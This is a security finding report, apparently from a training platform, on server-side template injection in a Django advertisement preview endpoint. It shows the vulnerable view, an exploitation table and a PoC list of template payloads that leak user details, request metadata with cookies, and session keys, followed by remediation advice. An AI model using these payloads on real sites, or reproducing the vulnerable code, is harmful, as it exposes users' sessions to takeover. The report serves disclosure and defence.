# Description

**CWE-1336**: Improper Neutralization of Special Elements Used in a Template Engine.

The advertisement preview endpoint takes a `template` query parameter, compiles it as a Django Template Language (DTL) template, and renders it server-side with the request object in context. No authentication is required and the input is not sanitised, so any visitor can supply template syntax and have the server evaluate it.

Vulnerable code (`Advertisement/views.py`):

```python
# Advertisement/views.py:781-787
def ad_preview(request):
    from django.template import Template, Context
    from django.http import HttpResponse as _HttpResponse
    template_str = request.GET.get('template', '<p>No ad</p>')   # line 784: attacker-controlled
    t = Template(template_str)                                   # line 785: compiled as a template
    c = Context({'request': request})                            # line 786: request exposed to template
    return _HttpResponse(t.render(c))                            # line 787
```

Routing (`Advertisement/urls.py:22`):

```python
path('preview/', views.ad_preview, name='ad_preview'),
```

The view has no `@login_required`, no `@require_GET`, no length limit, and no allow-list of tags. The view is mounted under the `advertisement/` prefix, so the reachable URL is `GET /advertisement/preview/?template=<payload>`.

Django's template engine is not designed to safely render templates supplied by untrusted users. Template source and user-controlled data must remain strictly separated.

Why this is dangerous:

- `Template(...)` on user input means the attacker controls the template itself, not just a variable. Tags, variables and filters in the input are all evaluated.
- `Context({'request': request})` hands the template the full `HttpRequest`. Through it, the template can reach `request.user` (including the user's attributes), `request.META`, and `request.session`.
- DTL is not Jinja2. Arithmetic such as `{{7*7}}` is not evaluated and direct Python execution is not possible. The impact is information disclosure and privilege probing through object traversal, plus any `{% load %}`-able tag library present on the server.

Note on the dev catalog: the catalog lists `{% load log %}{% get_admin_log ... %}` as a payload. No custom `log` tag library exists in the deployed source (a repository-wide search for `get_admin_log` and `register.tag` finds nothing), so that payload raises `TemplateSyntaxError` on this codebase. It is documented below for completeness and marked as not working against this deployment.

# Exploitation

| Step | Action | Result |
|------|--------|--------|
| 1 | Confirm the endpoint is reachable without a session: `GET /advertisement/preview/?template=<p>hello</p>` | Returns `<p>hello</p>` with HTTP 200. The `template` value is rendered, not echoed as text. |
| 2 | Send `{{request.user}}` as an anonymous visitor | Renders `AnonymousUser`. The server confirmed it evaluated a DTL variable. |
| 3 | Log in as any user in a browser, then send `{{request.user}}` in the same session | Renders the logged-in username. The request object is the victim/attacker's own session, showing the rendering user's identity. |
| 4 | Send `{{request.user.is_superuser}}` while logged in as a regular user, then as a superuser | Renders `False` for a regular user and `True` for a superuser. This is a privilege probe. |
| 5 | Send `{{request.META}}` | Renders the WSGI environ dictionary: `HTTP_HOST`, `SERVER_NAME`, `REMOTE_ADDR`, `HTTP_USER_AGENT`, `HTTP_COOKIE`, and other server variables. |
| 6 | Send `{% debug %}` | With `DEBUG = True` (`settings/development.py:14`, or `DEBUG=True` in `.env`) the full template context, settings module name and available filters and tags are dumped. With `DEBUG = False` (the production default, `settings/base.py:27` and `settings/production.py:24`) the tag outputs nothing. |
| 7 | Send `{% load static %}{% static "" %}` | Renders the configured `STATIC_URL`, revealing the static path layout. |
| 8 | Send `{% load log %}{% get_admin_log 10 as log %}...` | Fails with `TemplateSyntaxError`. The `log` library is not installed in this codebase (see note above). Not exploitable on this deployment. |

Practical notes for the tester:

- Use `curl -G --data-urlencode "template=<payload>" "http://<host>/advertisement/preview/"` so that braces, percent signs and spaces are encoded correctly.
- Payload results appear in the response body. Expect HTML escaping on dictionary output, so `'` may appear as `&#x27;`.

# PoC

All payloads go in the `template` query parameter. Expected outputs assume the stated session state and `DEBUG` setting.

**1. Anonymous identity probe**

```
GET /advertisement/preview/?template={{request.user}}
```

Expected output (anonymous visitor): `AnonymousUser`

**2. Privilege probe (run once as a regular user, once as a superuser)**

```
GET /advertisement/preview/?template={{request.user.is_superuser}}
```

Expected output: `False` for a regular user, `True` for a superuser.

**3. Account details of the rendering user**

```
GET /advertisement/preview/?template={{request.user.email}}
```

Expected output (logged in): the account's email address. The same pattern exposes any other attribute of `request.user` that does not begin with an underscore.

**4. Server metadata dump**

```
GET /advertisement/preview/?template={{request.META}}
```

Expected output: a Python dictionary repr containing `SERVER_NAME`, `REMOTE_ADDR`, `HTTP_HOST`, `HTTP_USER_AGENT`, `HTTP_COOKIE` and other WSGI variables.

**5. Session key of the rendering user**

```
GET /advertisement/preview/?template={{request.session.session_key}}
```

Expected output (logged in): the session key string. Anonymous requests return `None`.

**6. Full context dump (requires DEBUG=True)**

```
GET /advertisement/preview/?template={% debug %}
```

Expected output: the rendered template context, the `settings` module name, and the available filters and tags. With `DEBUG=False` the output is empty.

**7. Static configuration reveal**

```
GET /advertisement/preview/?template={% load static %}{% static "" %}
```

Expected output: the `STATIC_URL` value (for example `/static/`).

**8. Admin log (does not work on this codebase)**

```
GET /advertisement/preview/?template={% load log %}{% get_admin_log 10 as l %}{% for e in l %}{{e.user}} - {{e.object_repr}}<br>{% endfor %}
```

Expected output: a `TemplateSyntaxError` for the unknown `log` library. Listed here because it appears in the catalog. It would only succeed if a `log` tag library providing `get_admin_log` were added to the platform.

# Risk

| Dimension | Impact |
|-----------|--------|
| Confidentiality | Any anonymous visitor can read the rendering user's identity, email and other `request.user` attributes, the server's WSGI environ (`request.META`, including the `Cookie` header), and the current session key. With `DEBUG=True`, `{% debug %}` also discloses settings module names and framework internals. |
| Integrity | Direct writes are not possible with DTL alone, since the template language cannot call arbitrary Python or assign to model fields. The integrity impact is indirect: a leaked session key or session cookie enables account takeover, which then allows state-changing actions. |
| Availability | Template compilation and rendering are unbounded. Large or deeply nested inputs can consume CPU and memory on each request, and no rate limit or length cap applies. |

Overall severity: **High**. The endpoint is unauthenticated and any visitor can reach it, and it exposes session keys and request metadata, which is serious. The impact is bounded by DTL's restrictions (no arbitrary code execution, no arithmetic, no direct model writes), which keeps it below Critical. The catalog's CVSS 7.5 (High) is consistent with this. Hard difficulty: the attacker must know DTL syntax rather than Jinja2, and the most damaging payloads depend on DEBUG settings and the presence of additional tag libraries.

# Remediation

1. **Separate template source from user-controlled data** — use a fixed, server-controlled Django template for the advertisement preview. Never compile untrusted input using `Template()`. Render user-supplied content as data with appropriate output escaping and sanitisation where required.
2. **Minimise the rendering context** — provide only the explicitly required preview fields. Avoid exposing request objects, session information or other sensitive application objects to the rendering context.
3. **Use a dedicated restricted rendering mechanism if custom formatting is required** — do not rely on Django's `Engine` configuration as a security sandbox for untrusted templates.
4. **Enforce authentication and authorisation** — restrict advertisement management and preview functionality to users with the appropriate permissions. Enforce the expected HTTP method using `@require_GET` where applicable.
5. **Enforce input and resource limits** — apply appropriate input length limits, rate limiting and resource consumption controls to the preview functionality.
6. **Maintain secure production settings** — ensure that `DEBUG = False` remains enforced in the deployed environment and that detailed rendering errors are not exposed to clients.
7. **Add regression tests** — verify that user-controlled content is treated exclusively as data, that sensitive context information is not exposed, and that preview access controls and input limits are correctly enforced.

# Author
WOCSA
